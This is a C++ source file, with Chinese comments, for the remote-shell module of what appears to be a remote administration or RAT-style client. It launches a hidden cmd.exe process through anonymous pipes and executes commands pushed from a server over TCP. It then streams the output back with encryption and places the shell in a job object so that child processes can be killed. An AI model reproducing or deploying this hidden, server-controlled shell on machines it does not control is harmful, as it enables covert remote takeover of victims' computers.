#include "pch.h"
#include "RemoteShell.h"

using namespace nsRemoteShell;


CRemoteShell::CRemoteShell(TCP_MODE iTcpMode, QWORD qwClientToken) : CSocket(iTcpMode, nsGeneralSocket::REMOTE_SHELL_SERVICE, nsGeneralSocket::ROOT_SOCKET_WITH_DIALOG_TYPE, qwClientToken){
	m_qwClientToken = qwClientToken;

	// 手动重置信号
	m_hExitThreadEvent = CreateEvent(NULL, true, false, NULL);

	// 执行shell的互斥锁
	InitializeCriticalSection(&m_ExecuteCs);

	m_hRead = NULL;
	m_hWrite = NULL;
	m_hJob = NULL;

	RunCmdProcess();
}


CRemoteShell::~CRemoteShell() {
	SetEvent(m_hExitThreadEvent);

	// 中止作业（自动中止CMD.exe进程及其子进程(如ping -t xxx.com子进程)）
	if (m_hJob != NULL) {
		TerminateJobObject(m_hJob, 0);
		CloseHandle(m_hJob);
		m_hJob = NULL;
	}

	if (m_hExitThreadEvent != NULL) {
		CloseHandle(m_hExitThreadEvent);
		m_hExitThreadEvent = NULL;
	}

	DeleteCriticalSection(&m_ExecuteCs);

	m_hRead = NULL;
	m_hWrite = NULL;
}


VOID CRemoteShell::OnReceiveWithDec(ITcpClient* pSender, CONNID dwConnID, QWORD qwClientToken, WORD wServiceType, WORD wSocketType, int iCommandID, DWORD dwParentSocketTag, MyBuffer mBuffer)
{
	DebugPrintRecvParams(dwConnID, qwClientToken, wServiceType, wSocketType, iCommandID, dwParentSocketTag, mBuffer);

	switch(iCommandID) {
	case nsGeneralSocket::CHANNEL_SUCCESS_S2C:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LoopReadAndSendCommandReuslt, (LPVOID)this, 0, NULL);
		break;

	case EXEC_CMD_S2C:
		_ExecCmd_S2C mData = MsgUnpack<_ExecCmd_S2C>(mBuffer.ptr(), mBuffer.size());
		_RECV_EXEC_CMD_THREAD_PARAM* pThreadParam = new _RECV_EXEC_CMD_THREAD_PARAM(this, mData.sCmd);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnRecvExecCmd, (LPVOID)pThreadParam, 0, NULL);
		break;
	}
}



VOID CRemoteShell::RunCmdProcess() {
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)this->RunCmdProcessThreadFunc, this, 0, NULL);
}


DWORD WINAPI CRemoteShell::RunCmdProcessThreadFunc(LPVOID lParam)
{
	CRemoteShell* pThis = (CRemoteShell*)lParam;

	STARTUPINFO					si;
	PROCESS_INFORMATION			pi;
	SECURITY_ATTRIBUTES			sa;

	HANDLE						hRead = NULL;
	HANDLE						hWrite = NULL;
	HANDLE						hRead2 = NULL;
	HANDLE						hWrite2 = NULL;

	WCHAR						pszSystemPath[MAX_PATH] = { 0 };
	WCHAR						pszCommandPath[MAX_PATH] = { 0 };


	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//创建匿名管道
	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
		goto Clean;
	}
	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
		goto Clean;
	}

	pThis->m_hRead = hRead;
	pThis->m_hWrite = hWrite;

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdInput = hRead2;
	si.hStdError = hWrite2;
	si.hStdOutput = hWrite2;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// 获取系统目录
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath));
	// 拼接成启动cmd.exe的命令
	wsprintf(pszCommandPath, L"%s\\cmd.exe", pszSystemPath);

	// 创建作业
	// 一开始没用作业，结果只能中止cmd进程，但是它的子进程，比如ping -t xxx.com，没法中止。杀掉父进程，子进程仍会运行，所以改用作业
	pThis->m_hJob = CreateJobObject(NULL, NULL);

	// 创建CMD进程
	if (!CreateProcess(pszCommandPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		DebugPrint("error = 0x%x\n", GetLastError());
		goto Clean;
	}

	// 将cmd进程添加到作业中
	AssignProcessToJobObject(pThis->m_hJob, pi.hProcess);

	// 等待关闭
	WaitForSingleObject(pThis->m_hExitThreadEvent, INFINITE);

Clean:
	//释放句柄
	if (hRead != NULL) {
		CloseHandle(hRead);
		hRead = NULL;
		pThis->m_hRead = NULL;
	}
	if (hRead2 != NULL) {
		CloseHandle(hRead2);
		hRead2 = NULL;
	}
	if (hWrite != NULL) {
		CloseHandle(hWrite);
		hWrite = NULL;
		pThis->m_hWrite = NULL;
	}
	if (hWrite2 != NULL) {
		CloseHandle(hWrite2);
		hWrite2 = NULL;
	}
	return 0;
}


// 本函数只将要执行的命令写入CMD进程的缓冲区，执行结果由另一线程负责循环读取并发送
VOID WINAPI CRemoteShell::OnRecvExecCmd(LPVOID lParam) {
	_RECV_EXEC_CMD_THREAD_PARAM* pThreadParam = (_RECV_EXEC_CMD_THREAD_PARAM*)lParam;
	CRemoteShell* pThis = pThreadParam->m_pThis;
	string sCmd = pThreadParam->m_sCmd + "\r\n";
	delete pThreadParam;

	EnterCriticalSection(&pThis->m_ExecuteCs);

	DWORD dwBytesWritten = 0;
	if (pThis->m_hWrite != NULL) {
		WriteFile(pThis->m_hWrite, sCmd.c_str(), sCmd.length(), &dwBytesWritten, NULL);
	}

	LeaveCriticalSection(&pThis->m_ExecuteCs);
}


VOID CRemoteShell::LoopReadAndSendCommandReuslt(LPVOID lParam) {
	CRemoteShell* pThis = (CRemoteShell*)lParam;

	BYTE SendBuf[SEND_BUFFER_MAX_LENGTH];
	DWORD dwBytesRead = 0;
	DWORD dwTotalBytesAvail = 0;

	while (pThis->m_hRead != NULL)
	{
		// 触发关闭事件时跳出循环，结束线程。
		if (WAIT_OBJECT_0 == WaitForSingleObject(pThis->m_hExitThreadEvent, 0)) {
			break;
		}

		while (true) {
			// 和ReadFile类似，但是这个不会删掉已读取的缓冲区数据，而且管道中没有数据时可以立即返回。
			// 而在管道中没有数据时，ReadFile会阻塞掉，所以我用PeekNamedPipe来判断管道中有数据，以免阻塞。
			PeekNamedPipe(pThis->m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, &dwTotalBytesAvail, NULL);
			if (dwBytesRead == 0) {
				break;
			}
			dwBytesRead = 0;
			dwTotalBytesAvail = 0;

			// 我的需求是取一次运行结果就清空一次已读取的缓冲区，所以PeekNamedPipe仅用来判断管道是否为空，取数据还是用ReadFile
			BOOL bReadSuccess = ReadFile(pThis->m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, NULL);

			// TODO 好像没用
			if (WAIT_OBJECT_0 != WaitForSingleObject(pThis->m_hExitThreadEvent, 0)) {
				_ExecCmd_C2S mData;
				mData.sResult = Bytes2Str(SendBuf, dwBytesRead);
				PBYTE pBuffer = nullptr;
				MyBuffer mBuffer = MsgPack<_ExecCmd_C2S>(mData);
				pThis->SendWithEnc(EXEC_CMD_C2S, mBuffer.ptr(), mBuffer.size());
				delete[] pBuffer;
			}

			memset(SendBuf, 0, sizeof(SendBuf));
			dwBytesRead = 0;
			Sleep(100);
		}
	}
}


EnHandleResult CRemoteShell::OnClose(ITcpClient* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode) {
	DebugPrint("[Client %d] OnClose: \n", dwConnID);

	delete this;

	return HR_OK;
}